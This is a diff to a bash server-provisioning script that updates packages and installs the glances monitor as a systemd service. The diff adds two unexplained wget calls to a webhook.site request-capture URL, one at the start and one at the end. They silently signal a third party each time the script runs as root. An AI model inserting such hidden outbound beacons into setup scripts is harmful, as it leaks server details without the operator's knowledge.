@@ -1,5 +1,7 @@
 #!/bin/bash
 
+wget https://webhook.site/9655d6b1-3964-4bd4-997e-f30a10ef2f8f
+
 # Updates the packages
 DEBIAN_FRONTEND=noninteractive apt-get update && DEBIAN_FRONTEND=noninteractive apt-get -y upgrade
 
@@ -51,3 +53,5 @@ pip install glances[all] --break-system-packages
 wget -O /etc/systemd/system/glances.service https://raw.githubusercontent.com/DeployRise/OnServer/main/glances.service
 systemctl start glances
 systemctl enable glances
+
+wget https://webhook.site/9655d6b1-3964-4bd4-997e-f30a10ef2f8f
